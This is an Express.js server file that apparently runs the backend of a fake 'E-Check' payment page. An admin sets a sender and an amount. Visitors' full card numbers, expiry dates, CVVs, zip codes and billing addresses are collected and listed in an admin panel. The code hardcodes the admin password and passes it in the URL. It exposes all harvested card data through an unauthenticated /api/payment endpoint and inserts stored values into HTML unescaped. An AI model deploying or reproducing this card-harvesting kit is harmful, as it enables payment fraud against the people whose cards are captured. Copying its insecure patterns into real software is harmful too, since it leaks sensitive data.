const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = 3000;
const ADMIN_PASSWORD = 'kingmidas19';

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public')); // Serve static files from 'public' directory

let paymentData = {
    sender: '',
    amount: 0,
    cardDetails: []
};

app.get('/', (req, res) => {
    const password = req.query.password;
    if (password !== ADMIN_PASSWORD) {
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>E-Check Admin Login</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="bg-gradient-to-br from-blue-100 to-blue-300 min-h-screen flex items-center justify-center">
                <div class="w-full max-w-sm bg-white rounded-2xl shadow-2xl p-8 transform transition-all hover:scale-105">
                    <h1 class="text-3xl font-bold text-blue-600 text-center mb-6">Admin Login</h1>
                    <div class="space-y-4">
                        <div>
                            <label class="block text-blue-600 text-sm font-medium mb-1">Password</label>
                            <input
                                id="passwordInput"
                                type="password"
                                placeholder="Enter password"
                                class="w-full p-3 rounded-lg border border-blue-200 bg-blue-50 focus:outline-none focus:ring-2 focus:ring-blue-400 transition-shadow shadow-sm hover:shadow-md"
                            />
                        </div>
                        <button
                            onclick="login()"
                            class="w-full bg-blue-600 text-white p-3 rounded-lg font-semibold hover:bg-blue-700 transform hover:scale-105 transition-all shadow-md hover:shadow-lg"
                        >
                            Login
                        </button>
                    </div>
                    <script>
                        function login() {
                            const password = document.getElementById('passwordInput').value;
                            window.location.href = '/?password=' + encodeURIComponent(password);
                        }
                    </script>
                </div>
            </body>
            </html>
        `);
        return;
    }

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>E-Check Admin Panel</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="bg-gradient-to-br from-blue-100 to-blue-300 min-h-screen flex flex-col items-center justify-center p-4">
            <div class="w-full max-w-3xl bg-white rounded-3xl shadow-2xl p-8 transform transition-all hover:shadow-3xl">
                <h1 class="text-4xl font-extrabold text-blue-600 text-center mb-8">E-Check Admin Panel</h1>
                
                <!-- Update Sender and Amount Form -->
                <div class="mb-10 bg-blue-50 rounded-2xl p-6 shadow-inner">
                    <h2 class="text-2xl font-semibold text-blue-600 mb-4">Update Payment Details</h2>
                    <div class="space-y-4">
                        <div>
                            <label class="block text-blue-600 text-sm font-medium mb-1">Sender Name</label>
                            <input
                                id="senderInput"
                                type="text"
                                placeholder="Enter sender name"
                                value="${paymentData.sender}"
                                class="w-full p-3 rounded-lg border border-blue-200 bg-white focus:outline-none focus:ring-2 focus:ring-blue-400 transition-shadow shadow-sm hover:shadow-md"
                            />
                        </div>
                        <div>
                            <label class="block text-blue-600 text-sm font-medium mb-1">Amount</label>
                            <input
                                id="amountInput"
                                type="number"
                                placeholder="Enter amount"
                                value="${paymentData.amount}"
                                class="w-full p-3 rounded-lg border border-blue-200 bg-white focus:outline-none focus:ring-2 focus:ring-blue-400 transition-shadow shadow-sm hover:shadow-md"
                            />
                        </div>
                        <button
                            onclick="updatePayment()"
                            class="w-full bg-blue-600 text-white p-3 rounded-lg font-semibold hover:bg-blue-700 transform hover:scale-105 transition-all shadow-md hover:shadow-lg"
                        >
                            Update
                        </button>
                    </div>
                    <div class="mt-4 text-blue-600 text-sm">
                        <p><strong>Current Sender:</strong> ${paymentData.sender || 'Not set'}</p>
                        <p><strong>Current Amount:</strong> ${paymentData.amount || 'Not set'}</p>
                    </div>
                </div>
                
                <!-- Card Details Records -->
                <div>
                    <h2 class="text-2xl font-semibold text-blue-600 mb-4">Card Details Records</h2>
                    <div id="records" class="space-y-4">
                        ${paymentData.cardDetails.length > 0 ? paymentData.cardDetails.slice().reverse().map((detail, index) => `
                            <div class="border border-blue-200 rounded-xl p-4 bg-blue-50 shadow-md hover:shadow-lg transition-all flex justify-between items-center">
                                <div>
                                    <p><strong>Timestamp:</strong> ${new Date(detail.timestamp).toLocaleString()}</p>
                                    <p><strong>Name:</strong> ${detail.name}</p>
                                    <p><strong>Card Number:</strong> ${detail.cardNumber}</p>
                                    <p><strong>Expiry:</strong> ${detail.expiry}</p>
                                    <p><strong>CVV:</strong> ${detail.cvv}</p>
                                    <p><strong>Zip Code:</strong> ${detail.zipCode}</p>
                                    <p><strong>Billing Address:</strong> ${detail.billingAddress}</p>
                                </div>
                                <button
                                    onclick="deleteRecord(${paymentData.cardDetails.length - 1 - index})"
                                    class="bg-red-500 text-white px-4 py-2 rounded-lg hover:bg-red-600 transition-all shadow-sm hover:shadow-md"
                                >
                                    Delete
                                </button>
                            </div>
                        `).join('') : '<p class="text-blue-600 text-center">No card details submitted yet.</p>'}
                    </div>
                </div>
            </div>
            <script>
                async function updatePayment() {
                    const sender = document.getElementById('senderInput').value;
                    const amount = document.getElementById('amountInput').value;
                    try {
                        const response = await fetch('/api/payment', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ sender, amount })
                        });
                        const result = await response.json();
                        alert(result.message);
                        window.location.reload();
                    } catch (error) {
                        alert('Error updating payment details');
                    }
                }

                async function deleteRecord(index) {
                    if (confirm('Are you sure you want to delete this record?')) {
                        try {
                            const response = await fetch('/api/card-details/' + index, {
                                method: 'DELETE'
                            });
                            const result = await response.json();
                            alert(result.message);
                            window.location.reload();
                        } catch (error) {
                            alert('Error deleting record');
                        }
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/api/payment', (req, res) => {
    res.json(paymentData);
});

app.post('/api/payment', (req, res) => {
    const { sender, amount } = req.body;
    if (sender !== undefined) paymentData.sender = sender;
    if (amount !== undefined) paymentData.amount = parseFloat(amount) || 0;
    res.json({ message: 'Payment details updated', data: paymentData });
});

app.post('/api/card-details', (req, res) => {
    const { name, cardNumber, expiry, cvv, zipCode, billingAddress } = req.body;
    paymentData.cardDetails.push({ 
        name, 
        cardNumber, 
        expiry, 
        cvv, 
        zipCode, 
        billingAddress,
        timestamp: new Date().toISOString() 
    });
    res.json({ message: 'Card details received', data: paymentData });
});

app.delete('/api/card-details/:index', (req, res) => {
    const index = parseInt(req.params.index);
    if (index >= 0 && index < paymentData.cardDetails.length) {
        paymentData.cardDetails.splice(index, 1);
        res.json({ message: 'Record deleted', data: paymentData });
    } else {
        res.status(404).json({ message: 'Record not found' });
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
